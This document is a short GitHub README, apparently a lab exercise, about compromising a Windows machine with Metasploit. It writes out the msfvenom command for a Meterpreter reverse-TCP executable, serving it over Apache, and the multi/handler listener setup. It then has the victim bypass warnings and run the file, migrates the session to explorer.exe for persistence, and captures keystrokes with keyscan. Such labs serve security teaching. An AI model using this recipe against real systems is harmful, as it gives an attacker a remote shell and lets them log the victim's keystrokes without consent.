# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
![image](https://github.com/Sahithya373/Compromising-windows-using-Metasploit/assets/147017926/b6648e43-ea98-4778-95dd-e723e0c72deb)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

![image](https://github.com/Sahithya373/Compromising-windows-using-Metasploit/assets/147017926/d8db2da9-a060-4cef-af50-ab6c11832650)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/Sahithya373/Compromising-windows-using-Metasploit/assets/147017926/4a0475a2-651d-40dd-a854-787fb884aceb)

Start apache server sudo systemctl apache2 start

![image](https://github.com/Sahithya373/Compromising-windows-using-Metasploit/assets/147017926/f3c73031-1532-4c90-a8b5-d2ce5bcf3420)

Check the status of apache2

![image](https://github.com/Sahithya373/Compromising-windows-using-Metasploit/assets/147017926/97376ff3-c233-486b-90b9-5a2767bd3d81)

Invoke msfconsole:

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/Sahithya373/Compromising-windows-using-Metasploit/assets/147017926/75de1f8c-2e98-499d-987b-5c3467bba823)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/Sahithya373/Compromising-windows-using-Metasploit/assets/147017926/46cb4446-b71a-4b44-82f6-2006b9d9110d)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/Sahithya373/Compromising-windows-using-Metasploit/assets/147017926/fbaf0f8e-4a40-4aa5-831a-394cec2b1f10)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/Sahithya373/Compromising-windows-using-Metasploit/assets/147017926/269489e9-6556-4798-9bdd-b85fec67a57d)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/Sahithya373/Compromising-windows-using-Metasploit/assets/147017926/4989b64e-1439-4610-9e73-5aef90d5947a)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/Sahithya373/Compromising-windows-using-Metasploit/assets/147017926/dd164cd0-1a21-4bb4-9379-522c5adfe079)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
